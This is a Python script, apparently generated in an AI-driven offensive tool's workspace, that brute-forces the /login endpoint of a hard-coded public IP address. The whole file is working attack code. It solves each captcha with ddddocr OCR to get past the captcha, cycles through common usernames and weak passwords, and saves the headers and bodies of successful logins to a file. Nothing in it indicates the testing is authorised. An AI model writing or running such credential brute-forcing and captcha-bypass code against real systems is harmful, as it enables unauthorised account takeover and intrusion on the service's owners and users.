import requests
import re
import json
import base64
import io
import time

# 先确认 ddddocr + cv2 可用
try:
    import ddddocr
    HAS_OCR = True
except ImportError:
    HAS_OCR = False
    print("WARN: ddddocr not installed")

try:
    import cv2
    import numpy as np
    HAS_CV2 = True
except ImportError:
    HAS_CV2 = False
    print("WARN: cv2 not installed")

URL_BASE = "http://35.234.50.28:3400"
sess = requests.Session()
sess.verify = False
requests.packages.urllib3.disable_warnings()

def get_captcha():
    """GET /captcha → 图片 bytes + Session cookie"""
    r = sess.get(f"{URL_BASE}/captcha", timeout=5)
    return r.content, r.cookies

def ocr_captcha(img_bytes):
    """OCR 识别 captcha 答案"""
    if not HAS_OCR:
        return None
    ocr = ddddocr.DdddOcr(show_ad=False)
    try:
        ans = ocr.classification(img_bytes)
        return ans
    except Exception as e:
        print(f"OCR error: {e}")
        return None

def try_login(username, password, captcha_ans, sid_cookie):
    """POST /login 携带 Session + captcha"""
    cookies = {'connect.sid': sid_cookie}
    data = {
        'username': username,
        'password': password,
        'captcha': captcha_ans,
        'domain': 'AUTH_SERVER'
    }
    r = sess.post(f"{URL_BASE}/login", data=data, cookies=cookies, timeout=5, allow_redirects=False)
    return r

# 主流程
print("=== 3400 AuthServer /login 实战测试 ===\n")

users = ['admin', 'test', 'user1', 'kenny']
passwords = ['admin', 'admin123', 'Password1', 'Admin123', 'test', '123456']

tried = 0
hits = 0

for u in users:
    for p in passwords:
        tried += 1
        # 1. 获取 captcha
        try:
            img_bytes, _ = get_captcha()
        except Exception as e:
            print(f"[{tried}] Captcha fetch failed: {e}")
            time.sleep(0.5)
            continue
        
        # 提取 connect.sid
        sid = sess.cookies.get('connect.sid')
        if not sid:
            print(f"[{tried}] No sid cookie")
            continue
        
        # 2. OCR
        captcha_ans = ocr_captcha(img_bytes)
        if not captcha_ans:
            print(f"[{tried}] OCR failed")
            time.sleep(0.2)
            continue
        
        # 3. 登录尝试
        try:
            r = try_login(u, p, captcha_ans, sid)
            code = r.status_code
            size = len(r.content)
            # 解析 body
            try:
                body_json = r.json()
                msg = body_json.get('message', '')[:50]
            except:
                body_json = None
                msg = r.text[:50].replace('\n', ' ')
            
            print(f"[{tried}] {u}:{p} captcha={captcha_ans} → {code}/{size}B msg={msg}")
            
            if code == 200:
                hits += 1
                print(f"    *** HIT *** Body: {r.text[:500]}")
                # 保存成功响应
                with open(f"/opt/CyberStrikeAI/tmp/workspace/projects/cda6ab9b-2296-4103-b1f0-10410de2eca8/login_success.txt","a") as f:
                    f.write(f"=== {u}:{p} captcha={captcha_ans} ===\n")
                    f.write(f"Status: {code}\n")
                    f.write(f"Headers: {dict(r.headers)}\n")
                    f.write(f"Body: {r.text}\n\n")
            elif code == 429:
                # captcha 失效，等待重置
                time.sleep(1.5)
        except Exception as e:
            print(f"[{tried}] Login error: {e}")
        
        time.sleep(0.3)

print(f"\n=== Summary: tried={tried} hits={hits} ===")
